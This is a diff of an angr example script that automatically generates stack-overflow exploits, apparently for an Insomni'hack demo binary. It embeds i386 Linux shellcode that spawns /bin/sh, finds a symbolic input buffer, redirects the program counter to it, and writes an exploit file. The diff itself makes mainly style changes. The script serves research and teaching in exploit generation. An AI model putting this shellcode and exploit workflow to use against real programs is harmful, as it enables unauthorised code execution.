@@ -8,9 +8,10 @@ from angr import sim_options as so
 
 l = logging.getLogger("insomnihack.simple_aeg")
 
-
 # shellcraft i386.linux.sh
 shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
+print(shellcode)
+
 
 def fully_symbolic(state, variable):
     '''
@@ -22,6 +23,7 @@ def fully_symbolic(state, variable):
             return False
 
     return True
+
 
 def check_continuity(address, addresses, length):
     '''
@@ -35,6 +37,7 @@ def check_continuity(address, addresses, length):
 
     return True
 
+
 def find_symbolic_buffer(state, length):
     '''
     dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
@@ -44,13 +47,14 @@ def find_symbolic_buffer(state, length):
     # get all the symbolic bytes from stdin
     stdin = state.posix.stdin
 
-    sym_addrs = [ ]
+    sym_addrs = []
     for _, symbol in state.solver.get_variables('file', stdin.ident):
         sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))
 
     for addr in sym_addrs:
         if check_continuity(addr, sym_addrs, length):
             yield addr
+
 
 def main(binary):
     p = angr.Project(binary, auto_load_libs=False)
@@ -65,7 +69,6 @@ def main(binary):
     l.info("looking for vulnerability in '%s'", binary_name)
     exploitable_state = None
     while exploitable_state is None:
-        print(sm)
         sm.step()
         if len(sm.unconstrained) > 0:
             l.info("found some unconstrained states, checking exploitability")
@@ -91,7 +94,7 @@ def main(binary):
         sc_bvv = ep.solver.BVV(shellcode)
 
         # check satisfiability of placing shellcode into the address
-        if ep.satisfiable(extra_constraints=(memory == sc_bvv,ep.regs.pc == buf_addr)):
+        if ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):
             l.info("found buffer for shellcode, completing exploit")
             ep.add_constraints(memory == sc_bvv)
             l.info("pointing pc towards shellcode buffer")
@@ -109,9 +112,11 @@ def main(binary):
     print("run with `(cat %s; cat -) | %s`" % (filename, binary))
     return 0
 
+
 def test():
     main('./demo_bin')
     assert subprocess.check_output('(cat ./demo_bin-exploit; echo echo BUMO) | ./demo_bin', shell=True) == b'BUMO\n'
+
 
 if __name__ == '__main__':
     # silence some annoying logs
@@ -121,4 +126,4 @@ if __name__ == '__main__':
     if len(sys.argv) > 1:
         sys.exit(main(sys.argv[1]))
     else:
-        print("%s: <binary>" % sys.argv[0])
+        sys.exit(main('./demo_bin'))
